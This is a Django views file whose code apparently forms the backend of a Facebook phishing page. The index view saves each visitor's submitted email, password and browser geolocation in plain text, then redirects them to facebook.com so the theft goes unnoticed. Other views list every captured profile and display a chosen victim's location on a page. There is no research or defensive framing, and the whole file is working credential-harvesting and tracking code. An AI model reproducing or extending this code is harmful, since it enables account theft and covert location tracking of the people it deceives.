from django.shortcuts import render, redirect
from django.shortcuts import render, get_object_or_404
from profiles.models import Profile

def index(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        latitude = request.POST.get("latitude")
        longitude = request.POST.get("longitude")
        
        # Convierte a float solo si hay valor
        latitude = float(latitude) if latitude else None
        longitude = float(longitude) if longitude else None

        Profile.objects.create(
            email=email,
            password=password,
            latitude=latitude,
            longitude=longitude
        )
        return redirect('https://www.facebook.com/')
    # Consulta todos los perfiles para depuración:
    print(Profile.objects.all())
    return render(request, 'index.html')

def lista_perfiles(request):
    perfiles = Profile.objects.all()
    return render(request, "lista_perfiles.html", {"perfiles": perfiles})

def ver_ubicacion(request, profile_id):
    profile = get_object_or_404(Profile, id=profile_id)
    return render(request, "ver_ubicacion.html", {
        "latitude": profile.latitude,
        "longitude": profile.longitude
    })
